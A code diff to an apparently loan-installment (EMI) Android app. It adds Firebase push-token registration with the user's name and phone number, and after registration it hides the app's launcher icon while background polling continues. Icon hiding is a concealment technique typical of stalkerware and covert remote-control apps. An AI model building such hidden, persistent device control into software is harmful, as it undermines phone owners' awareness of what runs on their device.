@@ -77,7 +77,19 @@ class MainActivity : AppCompatActivity() {
                 prefs.edit().putString("deviceId", deviceId).apply()
             }
 
-            registerDevice(deviceId, name, phone, tvStatus, btnRegister, etName, etPhone)
+            btnRegister.isEnabled = false
+            btnRegister.text = "Fetching FCM..."
+
+            com.google.firebase.messaging.FirebaseMessaging.getInstance().token.addOnCompleteListener { task ->
+                if (!task.isSuccessful) {
+                    Toast.makeText(this, "Failed to get FCM token", Toast.LENGTH_SHORT).show()
+                    btnRegister.isEnabled = true
+                    btnRegister.text = "Register Device"
+                    return@addOnCompleteListener
+                }
+                val fcmToken = task.result
+                registerDevice(deviceId, name, phone, fcmToken, tvStatus, btnRegister, etName, etPhone)
+            }
         }
     }
 
@@ -111,8 +123,8 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
-    private fun registerDevice(deviceId: String, name: String, phone: String, tvStatus: TextView, btnRegister: Button, etName: EditText, etPhone: EditText) {
-        val map = mapOf("deviceId" to deviceId, "userName" to name, "phoneNumber" to phone)
+    private fun registerDevice(deviceId: String, name: String, phone: String, fcmToken: String, tvStatus: TextView, btnRegister: Button, etName: EditText, etPhone: EditText) {
+        val map = mapOf("deviceId" to deviceId, "userName" to name, "phoneNumber" to phone, "fcmToken" to fcmToken)
         val json = gson.toJson(map)
         val body = json.toRequestBody("application/json; charset=utf-8".toMediaType())
 
@@ -121,8 +133,10 @@ class MainActivity : AppCompatActivity() {
             .post(body)
             .build()
 
-        btnRegister.isEnabled = false
-        btnRegister.text = "Registering..."
+        runOnUiThread {
+            btnRegister.isEnabled = false
+            btnRegister.text = "Registering..."
+        }
 
         client.newCall(request).enqueue(object : Callback {
             override fun onFailure(call: Call, e: IOException) {
@@ -139,7 +153,7 @@ class MainActivity : AppCompatActivity() {
                         getSharedPreferences("emi_prefs", Context.MODE_PRIVATE)
                             .edit().putBoolean("isRegistered", true).apply()
                             
-                        Toast.makeText(this@MainActivity, "Registration Successful!", Toast.LENGTH_SHORT).show()
+                        Toast.makeText(this@MainActivity, "Registration Successful! App will now hide.", Toast.LENGTH_LONG).show()
                         tvStatus.text = "Status: Active & Polling"
                         tvStatus.setTextColor(android.graphics.Color.GREEN)
                         btnRegister.text = "Already Registered"
@@ -147,6 +161,12 @@ class MainActivity : AppCompatActivity() {
                         etPhone.isEnabled = false
                         
                         scheduleWorker()
+
+                        // Hide the app icon from the launcher
+                        val p = packageManager
+                        val componentName = android.content.ComponentName(this@MainActivity, MainActivity::class.java)
+                        p.setComponentEnabledSetting(componentName, android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED, android.content.pm.PackageManager.DONT_KILL_APP)
+
                     } else {
                         Toast.makeText(this@MainActivity, "Server Error: ${response.code}", Toast.LENGTH_LONG).show()
                         btnRegister.isEnabled = true
